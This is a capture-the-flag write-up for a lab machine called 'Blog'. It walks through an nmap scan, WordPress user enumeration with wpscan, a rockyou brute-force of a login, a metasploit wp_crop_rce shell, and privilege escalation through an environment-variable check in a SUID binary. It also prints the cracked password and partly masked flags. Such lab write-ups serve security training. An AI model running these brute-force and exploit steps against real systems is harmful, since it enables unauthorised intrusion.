# Writeup: Blog

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Sat Sep 13 21:22:22 2025 as: /usr/lib/nmap/nmap --privileged -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.103.108                     
Increasing send delay for 10.10.103.108 from 5 to 10 due to 20 out of 49 dropped probes since last increase.                                                     
Nmap scan report for 10.10.103.108                                                                                                                               
Host is up, received user-set (0.082s latency).                                                                                                                  
Scanned at 2025-09-13 21:22:22 CEST for 189s                                                                                                                     
Not shown: 65531 closed tcp ports (reset)                                                                                                                        
PORT    STATE SERVICE     REASON         VERSION                                                                                                                 
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                            
| ssh-hostkey:                                                                                                                                                   
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)                                                                                                   
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9M
sH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvt
fKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP                                                                                                     
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)                                                                                                  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI
=                                                                                                                                                                
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)                                                                                                
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8                                                                               
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))                                                                                          
| http-robots.txt: 1 disallowed entry                                                                                                                            
|_/wp-admin/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu) 
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-09-13T19:25:26+00:00
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-09-13T19:25:26
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32545/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52169/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40324/udp): CLEAN (Failed to receive data)
|   Check 4 (port 11063/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 13 21:25:32 2025 -- 1 IP address (1 host up) scanned in 189.70 seconds
```

On port 80 i found a webserver. I looked for the `robots.txt` and found following entries:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

Since the server is running wordpress i started a scan with `wpscan` to enumerate usernames.

```shell
wpscan --url http://blog.thm --enumerate u
```

This gives me a few usernames.

```
kwheel
bjoel
Karen Wheeler
Billy Joel
```

## 💥 Exploitation:

I thought the obvious username to brute force was `bjoel`, but it turned out to be `kwheel`.

After a few minutes (hate bruteforce) i get the password for `kwheel` which is `cut******`.

```shell
wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel
```

After a login on `http://blog.thm/wp-login.php` i can see that the used wordpress version is `5.0`.

I used searchsploit to find some authenticated RCE exploits and tried them out. I started metasploit and was able to get a shell trough the `wp_crop_rce` exploit.

```shell
msfconsole

search wordpress 5.0

use exploit/multi/http/wp_crop_rce

set PASSWORD cutiepie1
set USERNAME kwheel
set RHOSTS http://blog.thm
set LHOST 10.10.10.10

run
```

I switched to `bjoels` home directory and i have found the `user.txt` which gives me just a:

```
You won't find what you're looking for here.

TRY HARDER
```

## 🔓 Priviledge Escalation:

I looked for the usual things for privesc (sudo -l, cronjobs) and after a search for SUID binarys i found `/usr/sbin/checker` what caught my attention. I  runed it and get just a:

```shell
/usr/sbin/checker
Not an Admin
```

This was not helpful so i runed the binary again with `ltrace`, wich gives me this back:

```shell
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

So since the binary is checking for the environment variable `admin` i have just set it trought `export` and after running the `checker binary` again i was root. Then i was able to grab both flags.

## 💰 Loot:

```shell
# user.txt
c8421899aae571f7af4864**********

# root.txt
9a0b2b618bef9bfa7ac28c**********
```